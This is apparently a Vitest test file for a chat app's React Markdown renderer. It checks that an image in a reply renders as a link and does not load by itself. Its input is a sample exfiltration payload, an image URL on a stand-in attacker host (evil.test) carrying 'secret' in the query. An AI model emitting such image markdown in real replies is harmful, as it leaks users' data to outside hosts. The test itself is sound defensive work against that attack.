import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { expect, it } from "vitest";
import { Markdown } from "./Markdown";

// An image in a reply loads by itself when the chat, or a shared link to it,
// is opened, and its URL can carry data out: it renders as a link instead.
it("renders an image as a link to it, loading nothing", () => {
  const html = renderToStaticMarkup(
    createElement(
      Markdown,
      null,
      "![Their logo](https://evil.test/logo.png?d=secret)",
    ),
  );
  expect(html).not.toContain("<img");
  expect(html).toMatch(
    /<a href="https:\/\/evil\.test\/logo\.png\?d=secret"[^>]*>Their logo<\/a>/,
  );
});
